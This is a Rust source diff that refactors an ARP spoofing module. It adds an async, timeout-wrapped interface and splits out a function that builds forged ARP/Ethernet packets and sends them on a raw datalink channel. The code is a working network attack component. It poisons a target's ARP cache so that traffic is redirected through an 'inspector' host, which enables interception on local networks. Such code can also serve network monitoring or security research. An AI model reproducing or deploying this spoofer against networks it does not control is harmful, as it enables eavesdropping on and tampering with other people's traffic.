@@ -1,16 +1,57 @@
-use std::{net::Ipv4Addr, ptr::null, sync::{Arc, Mutex}};
+use std::{sync::{Arc, Mutex}, time::Duration};
 
-use nix::sys::socket;
-use pnet::{packet::{ethernet::{EtherType, MutableEthernetPacket, EtherTypes}, arp::{Arp, ArpHardwareType, ArpOperation, ArpPacket, MutableArpPacket}, MutablePacket}, util::MacAddr, datalink::{self, NetworkInterface, Channel, DataLinkSender, DataLinkReceiver}};
+use async_trait::async_trait;
 
-pub trait ArpSpoofer {
-    fn spoof_target(&mut self, target: NetworkLocation) -> bool;
+use pnet::{packet::{ethernet::{EtherType, MutableEthernetPacket, EtherTypes}, arp::{ArpHardwareType, ArpOperation, MutableArpPacket}, MutablePacket}, util::MacAddr, datalink::{self, NetworkInterface, Channel, DataLinkSender, DataLinkReceiver}};
+use tokio::{task, time::timeout};
+
+use super::network_location::NetworkLocation;
+
+#[async_trait]
+pub trait AsyncArpSpoofer {
+    async fn spoof_target(&mut self, target: NetworkLocation) -> bool;
 }
 
-#[derive(Clone, Copy)]
-pub struct NetworkLocation {
-    pub ipv4: Ipv4Addr,
-    pub hw: MacAddr
+pub struct AsyncArpSpooferImpl {
+    _impl: Arc<Mutex<ArpSpooferImpl>>,
+}
+
+impl AsyncArpSpooferImpl {
+    pub fn new(interface: NetworkInterface,
+        inspector: NetworkLocation, 
+        gateway: NetworkLocation
+    ) -> Self {
+        return Self {
+            _impl: Arc::from(Mutex::new(ArpSpooferImpl::new(interface, inspector, gateway))),
+        }
+    }
+}
+
+#[async_trait]
+impl AsyncArpSpoofer for AsyncArpSpooferImpl {
+    async fn spoof_target(&mut self, target: NetworkLocation) -> bool {
+        let executor = self._impl.clone();
+        let future = task::spawn_blocking(move || {
+            let lock = executor.lock();
+            let mut executor = lock.unwrap();
+            let result = executor.spoof_target(target);
+            return result;
+        });
+
+        let timeout = timeout(Duration::from_millis(3000), future);
+
+        let join_handle = tokio::spawn(timeout);
+
+        let value = join_handle.await;
+
+        let result = value.unwrap();
+
+        if let Ok(result) = result {
+            return result.unwrap();
+        } else {
+            return false;
+        }
+    }
 }
 
 pub struct ArpSpooferImpl {
@@ -26,14 +67,14 @@ impl ArpSpooferImpl {
     pub fn new(
         interface: NetworkInterface,
         inspector: NetworkLocation, 
-        gateway: NetworkLocation
+        gateway: NetworkLocation,
     ) -> Self {
         let mut result = Self {
             interface: interface,
             inspector: inspector,
             gateway: gateway,
             sender: None,
-            receiver: None
+            receiver: None,
         };
 
         result.setup_socket();
@@ -51,15 +92,8 @@ impl ArpSpooferImpl {
         self.sender = Some(tx);
         self.receiver = Some(rx);
     }
-}
 
-impl ArpSpoofer for ArpSpooferImpl {
-    fn spoof_target(&mut self, target: NetworkLocation) -> bool {
-        // instantiate packet
-
-        println!("Spoofing target: {}", target.ipv4.to_string());
-
-        // TODO: (@objectivecosta) Modify these values
+    fn build_arp_spoofed_packet(&self, target: NetworkLocation) -> Vec<u8> {
         let mut arp_packet_buffer = [0u8; 28];
         let mut  arp_packet = MutableArpPacket::new(&mut arp_packet_buffer).unwrap();
         arp_packet.set_hardware_type(ArpHardwareType::new(1)); // Ethernet
@@ -80,11 +114,19 @@ impl ArpSpoofer for ArpSpooferImpl {
         ethernet_packet.set_ethertype(EtherTypes::Arp);
         ethernet_packet.set_payload(arp_packet.packet_mut());
 
+        return ethernet_packet.packet_mut().to_vec();
+    }
+
+    fn spoof_target(&mut self, target: NetworkLocation) -> bool {
+        // instantiate packet
+
+        // TODO: (@objectivecosta) Modify these values
+        let packet = &self.build_arp_spoofed_packet(target);
         println!("Assembled packets!");
         println!("Preparing to send packet!");
 
         if let Some(sender) = self.sender.as_mut() {
-            let send_opt = sender.send_to(ethernet_packet.packet_mut(), None);
+            let send_opt = sender.send_to(packet, None);
 
                 if let Some(send_res) = send_opt {
                     if let Ok(_) = send_res {
@@ -100,15 +142,5 @@ impl ArpSpoofer for ArpSpooferImpl {
         }
 
         return false;
-    }
-}
-
-impl ArpSpooferImpl {
-    fn spoof_router_for_target(&self) {
-
-    }
-
-    fn spoof_target_for_router(&self) {
-
     }
 }
